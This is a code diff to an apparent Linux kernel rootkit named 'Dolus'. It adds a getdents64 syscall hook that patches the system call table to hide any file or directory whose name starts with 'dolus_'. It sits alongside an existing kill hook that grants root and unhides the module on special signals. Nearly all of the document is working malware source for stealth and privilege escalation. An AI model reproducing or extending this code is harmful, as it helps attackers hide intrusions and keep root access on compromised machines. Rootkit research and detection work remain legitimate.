@@ -11,6 +11,7 @@ created by: kargisimos
 #include <asm/paravirt.h>   //contains function for read_cr0(), e.g. read control register 0
 #include <linux/dirent.h>   // contains dirent structs etc
 #include <linux/list.h>     //macros related to linked lists are defined here e.g. list_add(), list_del()
+#include <linux/dirent.h>   //directory entries
 #include <linux/syscalls.h>
 
 //uncomment next line to enable debugging
@@ -107,10 +108,15 @@ then hands processing over to the actual syscall function.
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
 #define PTREGS_SYSCALL_STUB 1 
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
-static ptregs_t orig_kill; //TODO: SAVE ALL SYSCALL FUNCTIONS IN AN ARRAY FOR EASIER CODE USE
+static ptregs_t orig_kill;
+static ptregs_t orig_getdents64;
+
 #else 
 typedef asmlinkage long(*orig_kill_t)(pid_t pid, int sig);
 static orig_kill_t orig_kill;
+
+typedef asmlinkage long(*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
+static orig_getdents64_t orig_getdents64;
 #endif
 #endif
 
@@ -127,6 +133,17 @@ static int store(void) {
     else {
         DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
     }
+
+    // getdents64
+    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
+    if (!orig_getdents64) {
+        DEBUG_INFO("[-]Dolus: Unable to store orig_getdents64 table entry\n");
+        return 1;
+    }
+    else {
+        DEBUG_INFO("[+]Dolus: orig_getdents64 table entry successfully stored\n");
+    }
+
 // if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0), syscalls use direct arguments
 #else
     // kill
@@ -138,6 +155,17 @@ static int store(void) {
     else {
         DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
     }
+
+    // getdents64
+    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
+    if (!orig_getdents64) {
+        DEBUG_INFO("[-]Dolus: Unable to store orig_getdents64 table entry\n");
+        return 1;
+    }
+    else {
+        DEBUG_INFO("[+]Dolus: orig_getdents64 table entry successfully stored\n");
+    }
+
 #endif
     return 0;
 }
@@ -191,8 +219,15 @@ void unhide_dolus(void) {
 }
 
 
+//hiding directories that start with PREFIX
+#define PREFIX "dolus_"
+
+
+
+
 
 #if PTREGS_SYSCALL_STUB
+// kill hook function
 static asmlinkage long hack_kill(const struct pt_regs *regs) {
     void set_root(void);
     void unhide_dolus(void);
@@ -223,11 +258,90 @@ static asmlinkage long hack_kill(const struct pt_regs *regs) {
         return 0;
     }
 
-    //if received kill signal is not SIGSUPER, return original syscall
+    //if received kill signal is not in enum signals, return original syscall
     return orig_kill(regs);
 }
 
+// getdents64 hook function
+static asmlinkage int hack_getdents64(const struct pt_regs *regs) {
+    
+    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
+    // int fd = regs->di;
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+    // int count = regs->dx;
+
+    long error;
+
+    /* We will need these intermediate structures for looping through the directory listing */
+    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    unsigned long offset = 0;
+
+    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
+     * examine it's contents to remove anything that is prefixed by PREFIX.
+     * We also allocate dir_entry with the same amount of memory as  */
+    int ret = orig_getdents64(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ( (ret <= 0) || (dirent_ker == NULL) )
+        return ret;
+
+    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
+     * dirent_ker is our copy of the returned dirent struct that we can play with */
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
+    while (offset < ret)
+    {
+        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
+        current_dir = (void *)dirent_ker + offset;
+
+        /* Compare current_dir->d_name to PREFIX */
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        {
+            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else
+        {
+            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
+             * We set previous_dir to the current_dir before moving on and incrementing
+             * current_dir at the start of the loop */
+            previous_dir = current_dir;
+        }
+
+        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
+         * directory listing */
+        offset += current_dir->d_reclen;
+    }
+
+    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
+     * Note that dirent is already in the right place in memory to be referenced by the integer
+     * ret. */
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+
+done:
+    /* Clean up and return whatever is left of the directory listing to the user */
+    kfree(dirent_ker);
+    return ret;
+
+}
+
+
 #else
+// kill hook function
 static asmlinkage long hack_kill(pid_t pid, int sig) {
     void set_root(void);
 
@@ -257,6 +371,77 @@ static asmlinkage long hack_kill(pid_t pid, int sig) {
     //if received kill signal is not SIGSUPER, return original syscall
     return orig_kill(regs);
 }
+
+// getdents64 hook function
+static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
+    
+    /* We will need these intermediate structures for looping through the directory listing */
+    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+    unsigned long offset = 0;
+
+    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
+     * examine it's contents to remove anything that is prefixed by PREFIX.
+     * We also allocate dir_entry with the same amount of memory as  */
+    int ret = orig_getdents64(fd, dirent, count);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ( (ret <= 0) || (dirent_ker == NULL) )
+        return ret;
+
+    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
+     * dirent_ker is our copy of the returned dirent struct that we can play with */
+    long error;
+        error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
+    while (offset < ret)
+    {
+        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
+        current_dir = (void *)dirent_ker + offset;
+
+        /* Compare current_dir->d_name to PREFIX */
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+        {
+            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the 
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else
+        {
+            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
+             * We set previous_dir to the current_dir before moving on and incrementing
+             * current_dir at the start of the loop */
+            previous_dir = current_dir;
+        }
+
+        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
+         * directory listing */
+        offset += current_dir->d_reclen;
+    }
+
+    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
+     * Note that dirent is already in the right place in memory to be referenced by the integer
+     * ret. */
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+
+done:
+    /* Clean up and return whatever is left of the directory listing to the user */
+    kfree(dirent_ker);
+    return ret;
+}
+
 #endif
 
 
@@ -264,6 +449,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig) {
 static int hook(void) {
     // kill syscall
     __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
+    __sys_call_table[__NR_getdents64] = (unsigned long)&hack_getdents64;
     return 0;
 }
 
@@ -271,6 +457,7 @@ static int hook(void) {
 static int cleanup(void) {
     // kill 
     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
     return 0;
 }
 
